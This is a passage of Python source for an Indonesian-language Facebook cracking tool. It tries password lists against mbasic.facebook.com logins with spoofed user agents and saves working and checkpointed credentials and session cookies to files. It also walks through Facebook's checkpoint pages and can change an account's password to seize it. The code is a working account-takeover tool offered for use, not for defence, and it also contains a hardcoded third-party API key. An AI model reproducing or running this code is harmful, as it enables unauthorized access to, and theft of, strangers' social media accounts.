            head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio c.mp3")
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                akun.append(idf + "|" + pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio o.mp3")
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

# ------------------[ METHODE REGULER ]-------------------#
def reguler(idf,pwv):
    global loop,ok,cp
    ses = requests.Session()
    rr = random.randint
    rc = random.choice
    prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua = random.choice(prem)
    ua = random.choice(prem)
    for pw in pwv:
        try:
            if "ya" in ualuh: ua = ualu[0]
            ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D000b08fb-689b-45cc-a4f0-e3bb52a66842%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v12.0/dialog/oauth?encrypted_query_string=AeDsB_mIFREjNYDwuWOV6k5KfwSeC4nSl-8yAXLk5XCbopR9GlQNnen08SmfmGTmDFO7swiAtufmNBzLNoHVktViYNWLsMMsKFggcHqTBGw_qTfVzk3ml9EiKffgOgBnEqbn1YPNeupO5REfB_WT90ZWzs3lzjWnrzSipVowU4nkPHRy80GJSHDcwwwf41DcgWpcjnFmEIQxmC7D39UJZwdTW_ohl1mp3QDDn3dClMmGg4bFJFXNOHvC14kRR3Y9m32NGTPFzXmKUDeqdvpt_BsomYKPnJw3Sfe2poHNmgQ21QZ7dnztonslONMSAZoYjZuPsjAs31PH_4_gNjAGpodbr2-1l6pC4pvrlwzAi3m1fpF46rdYalexhL91PvuZsdWLjFmntZGRXm0I5jQUMPTz296eC46FLG5VT106opZy7W84b2LRNZI2zfC0n-YT0jWmUnOc8lo-8WcAO7A18WLpI3sO1RGuau8TyxcsUcgKWvwzEX6KzCuuR3sohzA-eNt_AcvpcJ04tDoWglO7Qf4VXNd6Wmr-B2QeId9MNufC3NttXzJaWjfv6iTv-JCnM2Gokwc_UPkomFvAEA7stKOytz1WR7ytP7h-2FwGTDGtQTuvh08Pf6CnjfImyq4PrwYLdEAQxsHtSR6conpdwwap3qTgf44q_zIDunU8g3iI7CSnrRh0YS_ZY5eejm6msy-ZLMXL208jYQb_HEr2jZS0tRP2AA6v8T96OFDXtIAhIEwM2ClBXM5FE9VRgS3TbbCZIGB3qZWvyiWTUn3PG-I3qyk9uehagsNZftcvGFnHYkB_OqPdLxoJiv9qV3lj-vhqPYbmuzHbuHhyDjGuu9B-mWtkKr-lXUXxUU9_phAftMiZ60iLRzFvK24bvxRorpUbEYC1pQcjGcQhkQ7VCV9Xo7RRmHAVCwRL73VSi3uboyMPuQi3DqPb18otubuTJ3XdqTFrgrWDaJcCytxCUPgL269zGnoFaxpHhvfPoe1KjWkZlOslzUxaWI6WgMGAhrY9ov20Gfuyw42SC-MZW2G7CBxYkMSsvZN_AfH70LVhp0JtuL6CGsr2qZ3CkE7odFoiUNxJf_NanKUdxbG38GXfb8Sf58_TDtGLzwRv&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D000b08fb-689b-45cc-a4f0-e3bb52a66842%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
            if "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio o.mp3")
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break		
            elif "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio c.mp3")
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                ceker(idf, pw)
                akun.append(idf + "|" + pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
# -----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
    session = requests.Session()
    w = session.get(
        "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
        cookies={"cookie": "noscript=1;" + kuki},
    ).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print(
                "\r%s  \033[0m              ➛ %s%s"
                % (P, H, game[i].replace("Ditambahkan pada", " Ditambahkan pada"))
            )
    except AttributeError:
        print("\r    %s\033[0m cookie invalid" % (M))
    w = session.get(
        "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
        cookies={"cookie": "noscript=1;" + kuki},
    ).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print(
                "\r%s  \033[0m              ➛ %s"
                % (P, game[i].replace("Kedaluwarsa", " Kedaluwarsa"))
            )
    except AttributeError:
        print("\r    %s \033[0mcookie invalid" % (M))


ops = []


def ceker(idf, pw):
    sess = requests.Session()
    data = {}
    uua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    sess.headers.update(
        {
            "User-Agent": uua,
            "Host": "m.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9",
            "referer": "https://mbasic.facebook.com/",
            "user-agent": "ua",
        }
    )
    soup = parser(
        sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,
        "html.parser",
    )
    link = soup.find("form", {"method": "post"})
    for x in soup("input"):
        data.update({x.get("name"): x.get("value")})
    data.update({"email": idf, "pass": pw})
    response = parser(
        sess.post("https://m.facebook.com" + link.get("action"), data=data).text,
        "html.parser",
    )
    try:
        link2 = response.find("form", {"method": "post"})
        listInput = ["fb_dtsg", "jazoest", "checkpoint_data", "submit[Continue]", "nh"]
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"): x.get("value")})
        responses = parser(
            sess.post("https://m.facebook.com" + link2.get("action"), data=data2).text,
            "html.parser",
        )
        cek = [cek.text for cek in responses.find_all("option")]
        if len(cek) == 0:
            pass
        else:
            for opsi in range(len(cek)):
                ops.append(print("\r  \033[0m              ➛" + cek[opsi]))
    except:
        pass
    if len(ops) == 0:
        pass
    console().print(f"{H2}• {P2}Columns(ops)")

# OPSI CEKER
def iphonee():
	rr = random.randint
	rc = random.choice
	iphone1 = rc(["4_3","9_0"])
	iphone2 = rc(["en-US","en-GB","%lang2%"])
	iphone3 = rc(["533.17.9","600.1.4"])
	iphone4 = rc(["5.0.2","9_0"])
	iphongg = f"Mozilla/5.0 (iPhone; CPU iPhone OS {iphone1} like Mac OS X; {iphone2}) adbeat.com/policy AppleWebKit/{iphone3} (KHTML, like Gecko) Version/{iphone4} Mobile/12A366 Safari/{str(rr(600,6533))}.{str(rr(1,18))}.{str(rr(4,5))}"
	return rc([iphongg])
	
def cek_opsi():
    c = len(akun)
    hu = (
        "Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu"
        % (c)
    )
    cetak(nel(hu, title="CEK OPSI"))
    input(x + "[" + h + "•" + x + "] Mulai")
    cek = "# PROSES CEK OPSI DIMULAI"
    sol().print(mark(cek, style="green"))
    love = 0
    for kes in akun:
        try:
            try:
                idf, pw = kes.split("|")[0], kes.split("|")[1]
            except IndexError:
                time.sleep(2)
                print("\r%s++++ %s ----> Error      %s" % (b, kes, x))
                print("\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s" % (u, x))
                continue
            bi = random.choice([u, k, kk, b, h, hh])
            print(
                "\r%s---> %s/%s ---> { %s }%s" % (bi, love, len(akun), idf, x), end=" "
            )
            sys.stdout.flush()
            ua = iphonee()
            ses = requests.Session()
            header = {
                "Host": "mbasic.facebook.com",
                "cache-control": "max-age=0",
                "upgrade-insecure-requests": "1",
                "origin": "https://mbasic.facebook.com",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": ua,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "x-requested-with": "mark.via.gp",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",
                "accept-encoding": "gzip, deflate",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            }
            hi = ses.get("https://mbasic.facebook.com")
            ho = sop(
                ses.post(
                    "https://mbasic.facebook.com/login.php",
                    data={"email": idf, "pass": pw, "login": "submit"},
                    headers=header,
                    allow_redirects=True,
                ).text,
                "html.parser",
            )
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jo = ho.find("form")
                    data = {}
                    lion = [
                        "nh",
                        "jazoest",
                        "fb_dtsg",
                        "submit[Continue]",
                        "checkpoint_data",
                    ]
                    for anj in jo("input"):
                        if anj.get("name") in lion:
                            data.update({anj.get("name"): anj.get("value")})
                    kent = sop(
                        ses.post(
                            "https://mbasic.facebook.com" + str(jo["action"]),
                            data=data,
                            headers=header,
                        ).text,
                        "html.parser",
                    )
                    print("\r%s++++ %s|%s ----> CP       %s" % (b, idf, pw, x))
                    opsi = kent.find_all("option")
                    if len(opsi) == 0:
                        print(
                            "\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)"
                            % (hh, x)
                        )
                    else:
                        for opsii in opsi:
                            print("\r%s---> %s%s" % (kk, opsii.text, x))
                except:
                    print("\r%s++++ %s|%s ----> CP       %s" % (b, idf, pw, x))
                    print("\r%s---> Tidak Dapat Mengecek Opsi%s" % (u, x))
            elif "c_user" in ses.cookies.get_dict().keys():
                print("\r%s++++ %s|%s ----> OK       %s" % (h, idf, pw, x))
            else:
                print("\r%s++++ %s|%s ----> SALAH       %s" % (x, idf, pw, x))
            love += 1
        except requests.exceptions.ConnectionError:
            print("")
            li = "# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI"
            sol().print(mark(li, style="red"))
            exit()
    dah = "# DONE"
    sol().print(mark(dah, style="green"))
    exit()


def ceker2(idf, pw):
    sess = requests.Session()
    data = {}
    uua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
    sess.headers.update(
        {
            "User-Agent": uua,
            "Host": "m.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9",
            "referer": "https://mbasic.facebook.com/",
            "user-agent": "ua",
        }
    )
    soup = parser(
        sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,
        "html.parser",
    )
    link = soup.find("form", {"method": "post"})
    for x in soup("input"):
        data.update({x.get("name"): x.get("value")})
    data.update({"email": idf, "pass": pw})
    response = parser(
        sess.post("https://m.facebook.com" + link.get("action"), data=data).text,
        "html.parser",
    )
    try:
        link2 = response.find("form", {"method": "post"})
        listInput = ["fb_dtsg", "jazoest", "checkpoint_data", "submit[Continue]", "nh"]
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"): x.get("value")})
        responses = parser(
            sess.post("https://m.facebook.com" + link2.get("action"), data=data2).text,
            "html.parser",
        )
        cek = [cek.text for cek in responses.find_all("option")]
        if len(cek) == 0:
            pass
        else:
            for opsi in range(len(cek)):
                opsi.append(print("[bold white]" + cek[opsi]))
    except:
        pass
    if len(opsi) == 0:
        pass
    print(" [+] Columns(opsi)")


# -----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform, random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import Thread, Event
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = [
    "Januari",
    "Februari",
    "Maret",
    "April",
    "Mei",
    "Juni",
    "Juli",
    "Agustus",
    "September",
    "Oktober",
    "November",
    "Desember",
]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
day = datetime.now().strftime("%d-%b-%Y")

M = "\x1b[1;91m"  # MERAH
H = "\x1b[1;92m"  # HIJAU
K = "\x1b[1;93m"  # KUNING
B = "\x1b[1;94m"  # BIRU
U = "\x1b[1;95m"  # UNGU
O = "\x1b[1;96m"  # BIRU MUDA
P = "\x1b[1;97m"  # PUTIH
J = "\033[38;2;255;127;0;1m"  # ORANGE
N = "\x1b[0m"  # WARNA MATI
acak = [P]
warna = random.choice(acak)
til = "\033[0m [+] "


def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        jeda(0.03)


ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []


def file_cp():
    dirs = os.listdir("CP")
    for file in dirs:
        prints(Panel(f"{M2}{(file)}", width=60, style=f"{color_panel}"))
    try:
        prints(
            Panel(
                f"{P2}Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt",
                width=60,
                style=f"{color_panel}",
            )
        )
        opsi()
    except IOError:
        prints(
            Panel(
                f"Tidak Ada File Untuk Di Cek Silahkan Crack Dulu",
                width=60,
                style=f"{color_panel}",
            )
        )
        exit()


def opsi():
    CP = "CP/"
    romi = input("%s%s%s\033[0mNama file %s> %s" % (U, til, O, M, K))
    if romi == "":
        print("%s%s\033[0Misi Yang Benar " % (M, til))
        jeda(2)
        opsi()
    try:
        file_cp = open(CP + romi, "r").readlines()
    except IOError:
        exit("\n%s%s\033[0mnama file %s\033[0m tidak tersedia" % (M, til, romi))
    jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik " % (U, til, O))
    pw = input(
        "\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s" % (U, til, O, M, K)
    )
    if pw in ["y", "Y"]:
        ubah_pass.append("ubah_sandi")
        pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s" % (U, til, O, M, K))
        if len(pw2) <= 5:
            print("%s%s Sandi Minimal 6 Karakter " % (M, til))
        else:
            pwbaru.append(pw2)
    print("%s%s%s\033[0mTotal Akun %s: %s%s " % (U, til, O, M, K, str(len(file_cp))))
    nomor = 0
    for fb in file_cp:
        akun = fb.replace("\n", "")
        ngecek = akun.split("|")
        nomor += 1
        print(
            "\n%s%s.%s\033[0mLogin Akun %s> %s%s"
            % (H, str(nomor), O, M, K, akun.replace(" *--> ", ""))
        )
        jeda(0.07)
        try:
            mengecek(ngecek[0].replace("", ""), ngecek[1])
        except requests.exceptions.ConnectionError:
            continue
    print("\n%s%s%s\033[0mSelesai Mengecek Akun" % (U, til, O))
    print("\n")
    exit()


data = {}
data2 = {}

def kontolll():
 rr = random.randint
 rc = random.choice
 konton = f"Mozilla/5.0 (Linux; Android 11; {str(rr(3,9))}.{str(rr(0,1))}.1; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
 return random.choice([konton])

def mengecek(user, pw):
    global loop, ubah_pass, pwbaru
    session = requests.Session()
    ua = kontolll()
    url = "https://mbasic.facebook.com"
    session.headers.update(
        {
            "Host": "mbasic.facebook.com",
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "origin": "https://mbasic.facebook.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "x-requested-with": "mark.via.gp",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    )
    soup = bs4.BeautifulSoup(
        session.get(url + "/login/?next&ref=dbl&fl&refid=8").text, "html.parser"
    )
    link = soup.find("form", {"method": "post"})
    for x in soup("input"):
        data.update({x.get("name"): x.get("value")})
    data.update({"email": user, "pass": pw})
    urlPost = session.post(url + link.get("action"), data=data)
    response = bs4.BeautifulSoup(urlPost.text, "html.parser")
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print("\r%s%s\033[0m akun terkunci sesi new" % (M, til))
        else:
            print(
                "\r%s%s\033[0m akun tidak checkpoint, silahkan anda login " % (til, H)
            )
            open("OK/OK-%s.txt" % (day), "a").write(" %s|%s\n" % (user, pw))
    elif "checkpoint" in session.cookies.get_dict():
        coki = (";").join(
            [
                "%s=%s" % (key, value)
                for key, value in session.cookies.get_dict().items()
            ]
        )
        title = re.findall("\<title>(.*?)<\/title>", str(response))
        link2 = response.find("form", {"method": "post"})
        listInput = ["fb_dtsg", "jazoest", "checkpoint_data", "submit[Continue]", "nh"]
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"): x.get("value")})
        an = session.post(url + link2.get("action"), data=data2)
        response2 = bs4.BeautifulSoup(an.text, "html.parser")
        cek = [cek.text for cek in response2.find_all("option")]
        number = 0
        print(
            "\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"
            % (U, O, P, str(len(cek)), O, M)
        )
        jeda(0.07)
        if len(cek) == 0:
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "ubah_sandi" in ubah_pass:
                    dat, dat2 = {}, {}
                    but = ["submit[Yes]", "nh", "fb_dtsg", "jazoest", "checkpoint_data"]
                    for x in response("input"):
                        if x.get("name") in but:
                            dat.update({x.get("name"): x.get("value")})
                    ubahPw = session.post(url + link2.get("action"), data=dat).text
                    resUbah = bs4.BeautifulSoup(ubahPw, "html.parser")
                    link3 = resUbah.find("form", {"method": "post"})
                    but2 = ["submit[Next]", "nh", "fb_dtsg", "jazoest"]
                    if "Buat Kata Sandi Baru" in re.findall(
                        "\<title>(.*?)<\/title>", str(ubahPw)
                    ):
                        for b in resUbah("input"):
                            dat2.update({b.get("name"): b.get("value")})
                        dat2.update({"password_new": "".join(pwbaru)})
                        an = session.post(url + link3.get("action"), data=dat2)
                        coki = (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in session.cookies.get_dict().items()
                            ]
                        )
                        print(
                            "\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"
                            % (H, til, N, H, user, pwbaru[0], coki)
                        )
                        open("OK/OK-%s.txt"%(day), "a").write(
                            "%s%s|%s|%s\n"%(H, user, pwbaru[0], coki)
                        )
                else:
                    print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H, til))
                    tree = Tree(" ", guide_style=f"{color_ok}")
                    tree.add(Panel(f"{ua}", width=60, style=f"{color_ok}"))
                    prints(tree)
                    open("OK/OK-%s.txt"%(day), "a").write(
                        "%s %s|%s|%s\n"%(H, user, pw, coki)
                    )
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>", str(response)):
                print("\r %s \33[31;1m akun terpasang autentikasi dua faktor			"%(M))
            else:
                print("%s%s\033[0m terjadi kesalahan"%(M, til))
        else:
            if "c_user" in session.cookies.get_dict():
                print("\r%s akun tidak checkpoint, silahkan anda login "%(H))
                open("OK/OK-%s.txt"%(day), "a").write("%s%s|%s\n"%(H, user, pw))
        for opsi in range(len(cek)):
            number += 1
            jalan("  %s%s. %s%s"%(P, str(number), K, cek[opsi]))
    elif "login_error" in str(response):
        oh = response.find("div", {"id": "login_error"}).find("div").text
        print("%s %s"%(M, oh))
    else:
        tree = Tree(" ", guide_style=f"bold white")
        tree.add(
            Panel(
                f"{P2}login gagal, silahkan cek kembali id dan kata sandi",
                width=60,
                style=f"{color_panel}",
            )
        )
        prints(tree)


def scarpping_ua():
    uascrap = []
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    try:
        response = requests.get(url, headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()["ua"])
        else:
            uascrap.append(
                "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
            )
    except requests.exceptions.ConnectionError:
        uascrap.append(
            "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
        )


# -----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count
from requests import get
from bs4 import BeautifulSoup
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel

done = False
results = []


def back():
    login()


def clear():
    if "linux" in sys.platform.lower():
        os.system("clear")
    elif "win" in sys.platform.lower():
        os.system("cls")


def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()


def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(":")[1]
        Detik = (
            str(Total_Waktu).split(":")[2].replace(".", ",").split(",")[0]
            + ","
            + str(Total_Waktu).split(":")[2].replace(".", ",").split(",")[1][:1]
        )
        print("\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n" % (Menit, Detik))
    except Exception as e:
        print("\n\n [+] Program Selesai Dalam Waktu 0 Detik\n")

def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        jeda(0.03)
        
class Lain:
    ###----------[ FUNCTION INIT ]---------- ###
    def __init__(self, cookie):
        self.cookie = cookie
        self.file = []
        self.listfile = []

    ###----------[ MENU ]---------- ###
    def menu(self):
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema
[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. info cookies
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",
                width=60,
                style=f"{color_panel}",
            )
        )
        menu = console.input(f" {H2}• {P2}pilih menu : ")
        if menu in ["01", "1"]:
            self.cek_hasil()
        if menu in ["02", "2"]:
            target()
        elif menu in ["03", "3"]:
            print("prem")
        elif menu in ["04", "4"]:
            self.ganti_tema()
        elif menu in ["05", "5"]:
            self.tampil_cookie()
        elif menu in ["06", "6"]:
            os.system("rm .vipercok.txt")
            os.system("rm .vipertok.txt")
            exit(
                prints(
                    Panel(
                        f"""{H2}berhasil menghapus cookie dan token, silahkan ketik ulang python run.py""",
                        width=60,
                        style=f"{color_panel}",
                    )
                )
            )
        else:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",
                        width=60,
                        style=f"{color_panel}",
                    )
                )
            )

